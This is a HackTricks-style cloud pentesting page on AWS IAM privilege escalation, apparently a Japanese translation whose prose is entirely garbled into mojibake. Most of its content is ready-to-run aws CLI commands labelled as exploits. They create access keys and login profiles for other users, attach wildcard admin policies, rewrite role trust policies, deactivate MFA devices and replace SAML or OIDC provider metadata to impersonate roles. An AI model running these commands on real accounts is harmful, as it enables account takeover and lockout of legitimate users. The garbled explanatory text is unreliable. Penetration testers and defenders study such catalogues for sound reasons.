# AWS - IAM Privesc

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ã§ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>

## IAM

IAMã«ã¤ã„ã¦ã®è©³ç´°ã¯ã“ã¡ã‚‰ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„:

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### **`iam:CreatePolicyVersion`**

æ–°ã—ã„IAMãƒãƒªã‚·ãƒ¼ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ä½œæˆã™ã‚‹æ¨©é™ã‚’ä»˜ä¸ã—ã€`--set-as-default`ãƒ•ãƒ©ã‚°ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§`iam:SetDefaultPolicyVersion`æ¨©é™ã®å¿…è¦ã‚’è¿‚å›ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚«ã‚¹ã‚¿ãƒ æ¨©é™ã‚’å®šç¾©ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚³ãƒãƒ³ãƒ‰:**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**å½±éŸ¿:** ä»»æ„ã®ãƒªã‚½ãƒ¼ã‚¹ã«å¯¾ã—ã¦ä»»æ„ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¨±å¯ã™ã‚‹ã“ã¨ã§ã€ç›´æ¥çš„ã«æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã¾ã™ã€‚

### **`iam:SetDefaultPolicyVersion`**

IAMãƒãƒªã‚·ãƒ¼ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ä»–ã®æ—¢å­˜ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«å¤‰æ›´ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã¾ã™ã€‚æ–°ã—ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚ˆã‚Šå¤šãã®æ¨©é™ãŒã‚ã‚‹å ´åˆã€æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**Bashã‚³ãƒãƒ³ãƒ‰:**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**å½±éŸ¿ï¼š** ã‚ˆã‚Šå¤šãã®æ¨©é™ã‚’æœ‰åŠ¹ã«ã™ã‚‹ã“ã¨ã§é–“æ¥çš„ãªæ¨©é™æ˜‡æ ¼ãŒç™ºç”Ÿã—ã¾ã™ã€‚

### **`iam:CreateAccessKey`**

åˆ¥ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚­ãƒ¼IDã¨ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚¢ã‚¯ã‚»ã‚¹ã‚­ãƒ¼ã‚’ä½œæˆã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã€æ½œåœ¨çš„ãªæ¨©é™æ˜‡æ ¼ã«ã¤ãªãŒã‚Šã¾ã™ã€‚

**ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆï¼š**
```bash
aws iam create-access-key --user-name <target_user>
```
**å½±éŸ¿ï¼š** ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ‹¡å¼µã•ã‚ŒãŸæ¨©é™ã‚’å¼•ãå—ã‘ã‚‹ã“ã¨ã«ã‚ˆã‚‹ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

AWSã‚³ãƒ³ã‚½ãƒ¼ãƒ«ãƒ­ã‚°ã‚¤ãƒ³ç”¨ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’è¨­å®šã™ã‚‹ã“ã¨ã‚’å«ã‚€ã€ãƒ­ã‚°ã‚¤ãƒ³ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã®ä½œæˆã¾ãŸã¯æ›´æ–°ã‚’è¨±å¯ã—ã€ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã«ã¤ãªãŒã‚Šã¾ã™ã€‚

**ä½œæˆã«å¯¾ã™ã‚‹ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆï¼š**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**ã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆã®ãŸã‚ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆï¼š**
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**å½±éŸ¿ï¼š** "ä»»æ„"ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ã“ã¨ã«ã‚ˆã‚‹ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### **`iam:UpdateAccessKey`**

ç„¡åŠ¹ã«ã•ã‚ŒãŸã‚¢ã‚¯ã‚»ã‚¹ã‚­ãƒ¼ã‚’æœ‰åŠ¹ã«ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã€æ”»æ’ƒè€…ãŒç„¡åŠ¹ãªã‚­ãƒ¼ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆï¼š**

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
**å½±éŸ¿ï¼š** ã‚¢ã‚¯ã‚»ã‚¹ã‚­ãƒ¼ã‚’å†æ´»æ€§åŒ–ã™ã‚‹ã“ã¨ã§ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

ç‰¹å®šã®AWSã‚µãƒ¼ãƒ“ã‚¹ï¼ˆä¾‹ï¼šCodeCommitã€Amazon Keyspacesï¼‰ã®ãŸã‚ã®èªè¨¼æƒ…å ±ã‚’ç”Ÿæˆã¾ãŸã¯ãƒªã‚»ãƒƒãƒˆã™ã‚‹ã“ã¨ãŒã§ãã€é–¢é€£ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ¨©é™ã‚’ç¶™æ‰¿ã—ã¾ã™ã€‚

**ä½œæˆã®ãŸã‚ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆï¼š**

{% code overflow="wrap" %}
```bash
aws iam create-service-specific-credential --user-name <username> --service-name <service>
```
**æ¨©é™æ˜‡æ ¼ã®ãŸã‚ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ:**

{% code overflow="wrap" %}
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
{% endcode %}

**å½±éŸ¿:** ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚µãƒ¼ãƒ“ã‚¹æ¨©é™å†…ã§ã®ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚„ã‚°ãƒ«ãƒ¼ãƒ—ã«ãƒãƒªã‚·ãƒ¼ã‚’ã‚¢ã‚¿ãƒƒãƒã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã€ã‚¢ã‚¿ãƒƒãƒã•ã‚ŒãŸãƒãƒªã‚·ãƒ¼ã®æ¨©é™ã‚’ç¶™æ‰¿ã™ã‚‹ã“ã¨ã§æ¨©é™ã‚’ç›´æ¥æ˜‡æ ¼ã•ã›ã¾ã™ã€‚

**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å¯¾ã™ã‚‹ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ:**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**ã‚°ãƒ«ãƒ¼ãƒ—å‘ã‘ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆï¼š**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**å½±éŸ¿:** ãƒãƒªã‚·ãƒ¼ãŒè¨±å¯ã™ã‚‹ã‚ã‚‰ã‚†ã‚‹ã‚‚ã®ã¸ã®ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

ãƒ­ãƒ¼ãƒ«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã€ã¾ãŸã¯ã‚°ãƒ«ãƒ¼ãƒ—ã«ãƒãƒªã‚·ãƒ¼ã‚’ã‚¢ã‚¿ãƒƒãƒã¾ãŸã¯è¨­å®šã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã€è¿½åŠ ã®æ¨©é™ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ã§ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚

**ãƒ­ãƒ¼ãƒ«ã«å¯¾ã™ã‚‹ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ:**
```bash
bashCopy codeaws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**ã‚¤ãƒ³ãƒ©ã‚¤ãƒ³ãƒãƒªã‚·ãƒ¼ã‚’åˆ©ç”¨ã—ãŸã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ:**
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
ãƒãƒªã‚·ãƒ¼ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**å½±éŸ¿:** ãƒãƒªã‚·ãƒ¼ã‚’é€šã˜ã¦æ¨©é™ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### **`iam:AddUserToGroup`**

è‡ªåˆ†è‡ªèº«ã‚’IAMã‚°ãƒ«ãƒ¼ãƒ—ã«è¿½åŠ ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã€ã‚°ãƒ«ãƒ¼ãƒ—ã®æ¨©é™ã‚’ç¶™æ‰¿ã™ã‚‹ã“ã¨ã§æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã¾ã™ã€‚

**ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ:**

{% code overflow="wrap" %}
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
{% endcode %}

**å½±éŸ¿:** ã‚°ãƒ«ãƒ¼ãƒ—ã®æ¨©é™ãƒ¬ãƒ™ãƒ«ã¸ã®ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### **`iam:UpdateAssumeRolePolicy`**

ãƒ­ãƒ¼ãƒ«ã®ä¿¡é ¼ãƒãƒªã‚·ãƒ¼ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’å¤‰æ›´ã—ã€ãã®ãƒ­ãƒ¼ãƒ«ã¨é–¢é€£ã™ã‚‹æ¨©é™ã®å¼•ãå—ã‘ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚

**æ‚ªç”¨:**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
ãƒãƒªã‚·ãƒ¼ãŒä»¥ä¸‹ã®ã‚ˆã†ã«ãªã£ã¦ã„ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ãƒ­ãƒ¼ãƒ«ã‚’å¼•ãå—ã‘ã‚‹æ¨©é™ã‚’ä¸ãˆã¦ã„ã‚‹å ´åˆï¼š
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**å½±éŸ¿:** ä»»æ„ã®ãƒ­ãƒ¼ãƒ«ã®æ¨©é™ã‚’ä»®å®šã™ã‚‹ã“ã¨ã«ã‚ˆã‚‹ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

CodeCommitã¸ã®èªè¨¼ç”¨ã«SSHå…¬é–‹éµã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã€MFAãƒ‡ãƒã‚¤ã‚¹ã‚’ç„¡åŠ¹åŒ–ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã€æ½œåœ¨çš„ãªé–“æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**SSHéµã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã®æ‚ªç”¨:**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**MFAç„¡åŠ¹åŒ–ã®ãŸã‚ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ:**
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**å½±éŸ¿:** CodeCommitã‚¢ã‚¯ã‚»ã‚¹ã‚’æœ‰åŠ¹ã«ã™ã‚‹ã‹ã€MFAä¿è­·ã‚’ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ã§é–“æ¥çš„ãªæ¨©é™æ˜‡æ ¼ãŒå¯èƒ½ã§ã™ã€‚

### **`iam:ResyncMFADevice`**

MFAãƒ‡ãƒã‚¤ã‚¹ã®å†åŒæœŸã‚’è¨±å¯ã—ã€MFAä¿è­·ã‚’æ“ä½œã™ã‚‹ã“ã¨ã§é–“æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**Bashã‚³ãƒãƒ³ãƒ‰:**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**å½±éŸ¿ï¼š** MFAãƒ‡ãƒã‚¤ã‚¹ã®è¿½åŠ ã‚„æ“ä½œã«ã‚ˆã‚‹é–“æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

ã“ã‚Œã‚‰ã®æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€**SAMLæ¥ç¶šã®XMLãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã®å¾Œã€**SAMLãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³**ã‚’æ‚ªç”¨ã—ã¦ã€ãã‚Œã‚’ä¿¡é ¼ã—ã¦ã„ã‚‹ä»»æ„ã®**ãƒ­ãƒ¼ãƒ«ã§ãƒ­ã‚°ã‚¤ãƒ³**ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

ã“ã®æ“ä½œã‚’è¡Œã†ã¨ã€**æ­£è¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãƒ­ã‚°ã‚¤ãƒ³ã§ããªããªã‚‹**ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã—ã‹ã—ã€XMLã‚’å–å¾—ã§ãã‚‹ã®ã§ã€è‡ªåˆ†ã®ã‚‚ã®ã‚’è¨­ç½®ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã—ã€ä»¥å‰ã®è¨­å®šã«æˆ»ã™ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
TODO: æŒ‡å®šã•ã‚ŒãŸãƒ­ãƒ¼ãƒ«ã§ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹SAMLãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’ç”Ÿæˆã™ã‚‹ãƒ„ãƒ¼ãƒ«
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(ã“ã‚Œã«ã¤ã„ã¦ã¯ä¸ç¢ºã‹ã§ã™) æ”»æ’ƒè€…ãŒã“ã‚Œã‚‰ã®**æ¨©é™**ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€æ–°ã—ã„**Thumbprint**ã‚’è¿½åŠ ã—ã¦ã€ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã‚’ä¿¡é ¼ã™ã‚‹ã™ã¹ã¦ã®ãƒ­ãƒ¼ãƒ«ã§ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‚ˆã†ã«ãªã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
## å‚è€ƒæ–‡çŒ®

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ã§<strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã™ã‚‹ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>
